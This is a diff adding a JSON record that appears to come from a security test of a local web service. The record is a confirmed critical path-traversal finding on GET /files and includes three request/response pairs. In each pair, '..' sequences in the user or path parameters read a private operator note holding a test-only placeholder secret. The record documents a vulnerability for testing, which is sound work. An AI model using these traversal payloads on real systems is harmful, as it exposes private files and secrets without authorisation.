@@ -1,0 +1,73 @@
+{
+  "id": "T15",
+  "route": "GET /files",
+  "category": "I, E",
+  "severity": "Критическая",
+  "verdict": "подтверждена",
+  "why": "параметры user/path с .. вывели за files/<user> и прочитали private/operator-note.txt (TEST_ONLY_OPERATOR_SECRET)",
+  "records": [
+    {
+      "request": {
+        "method": "GET",
+        "path": "/files?user=..&path=private/operator-note.txt",
+        "headers": {},
+        "body": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.14.4",
+          "Date": "Fri, 30 Oct 2026 21:37:43 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "40"
+        },
+        "body": "{\"content\": \"TEST_ONLY_OPERATOR_SECRET\"}",
+        "json": {
+          "content": "TEST_ONLY_OPERATOR_SECRET"
+        }
+      }
+    },
+    {
+      "request": {
+        "method": "GET",
+        "path": "/files?user=alice&path=../../private/operator-note.txt",
+        "headers": {},
+        "body": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.14.4",
+          "Date": "Fri, 30 Oct 2026 21:37:43 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "40"
+        },
+        "body": "{\"content\": \"TEST_ONLY_OPERATOR_SECRET\"}",
+        "json": {
+          "content": "TEST_ONLY_OPERATOR_SECRET"
+        }
+      }
+    },
+    {
+      "request": {
+        "method": "GET",
+        "path": "/files?user=../private&path=operator-note.txt",
+        "headers": {},
+        "body": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.14.4",
+          "Date": "Fri, 30 Oct 2026 21:37:43 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "40"
+        },
+        "body": "{\"content\": \"TEST_ONLY_OPERATOR_SECRET\"}",
+        "json": {
+          "content": "TEST_ONLY_OPERATOR_SECRET"
+        }
+      }
+    }
+  ]
+}
